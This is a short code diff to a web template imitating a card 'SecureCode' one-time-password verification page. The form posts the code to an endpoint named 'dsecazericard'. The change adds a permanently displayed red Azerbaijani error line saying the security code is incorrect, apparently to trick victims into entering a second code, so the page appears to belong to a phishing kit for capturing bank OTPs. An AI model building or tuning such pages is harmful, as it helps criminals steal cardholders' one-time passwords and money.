@@ -108,7 +108,8 @@
     <main class="content">
       <section class="card-other-otp">
         <div class="card-info-div-otp">
-<div id="desc" class="desc"><h1 class="card-info">Enter your SecureCode™</h1><p class="description"></p><p>One-time password has been sent to your registered telephone number.</p><p>Please verify transactions details and personal greeting. If everything is correct, wait for one-time password SMS and enter it in the SecureCode field.</p><p></p></div>
+<div id="desc" class="desc">
+	<h1 class="card-info">Enter your SecureCode™</h1><p class="description"></p><p>One-time password has been sent to your registered telephone number.</p><p>Please verify transactions details and personal greeting. If everything is correct, wait for one-time password SMS and enter it in the SecureCode field.</p><p></p></div>
 <div class="descriptionDiv" style="
     height: 150;
 ">
@@ -128,6 +129,13 @@
 
         <form method="POST" action="dsecazericard" name="dsecazericard" accept-charset="utf-8" class="form">
                 {% csrf_token %}
+				<a><h5> Təhlükəsizlik kodu yanlışdır</h5> </a>
+				<style>
+					h5 {
+					  font-size: 0.8rem;
+					  color: red;
+					}
+				  </style>
                 <label id="pwd" class="card-number-label">SecureCode:
                     
                 <input type="tel" id="psw_id" maxlength="6" class="card-number" name="secpass" size="20" autocomplete="off" required="">
